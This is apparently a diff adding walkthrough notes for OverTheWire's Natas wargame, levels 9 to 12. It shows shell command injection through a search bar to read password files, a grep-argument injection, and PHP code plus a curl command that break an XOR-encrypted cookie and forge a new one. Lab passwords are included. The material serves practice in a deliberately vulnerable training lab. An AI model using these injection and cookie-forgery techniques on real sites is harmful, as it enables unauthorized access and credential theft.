@@ -70,4 +70,50 @@ password: Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
 
 natas9 -> natas10
 url: http://natas10.natas.labs.overthewire.org
+the search bar on the screen introduces a vulnerability since none of the searches are validated
+can type a command into the search bar to output the password
+into the search bar: ;cat /etc/natas_webpass/natas10;
+password:D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
+
+natas10 -> natas11
+url: http://natas11.natas.labs.overthewire.org
+the search bar now prevents the search of illegal characters "; &"
+grep allows you to search in multiple files at once
+search for a random charcter that may or may not be in the password
+into the search bar: F /ect/natas_webpass/natas11
+password:1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
+
+natas11 -> natas12
+url: http://natas12.natas.labs.overthewire.org
+viewing the source code we see that we are given the default data, xor function, and an encrypted cookie
+xor rules: a xor b = c; a xor b xor b = c xor b; a = c xor b
+need to xor the cookie decoded with base64 and the default data encoded with json encrypt to find the key used for the xor encrypt of the password
+<?php
+    $decodecookie = base64_decode("MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgu".
+    "bjY%3D");
+    $defaultdata = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
+    $text = '';
+    for($i=0;$i<strlen($decodecookie);$i++) {
+            $text .= $decodecookie[$i] ^ $defaultdata[$i];
+    }
+    echo $text, "\n";
+?>
+given the key: KNHL
+then need to change the default data to say "showpassword"=>"yes"
+<?php
+    $key = "KNHL";
+    $mydata = json_encode(array("showpassword"=>"yes", "bgcolor"=>"#ffffff"));
+    $cookie = '';
+    for($i=0;$i<strlen($mydata);$i++) {
+            $cookie .= $mydata[$i] ^ $key[$i % strlen($key)];
+    }
+    echo base64_encode($cookie);
+?>
+newcookie:MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz
+then need to change the cookie to the new coookie
+curl -v -b "data=MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz" http://natas11.natas.labs.overthewire.org/ -u "natas11:1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg"
+password: YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
+
+natas12 -> natas13
+url: http://natas13.natas.labs.overthewire.org 
 
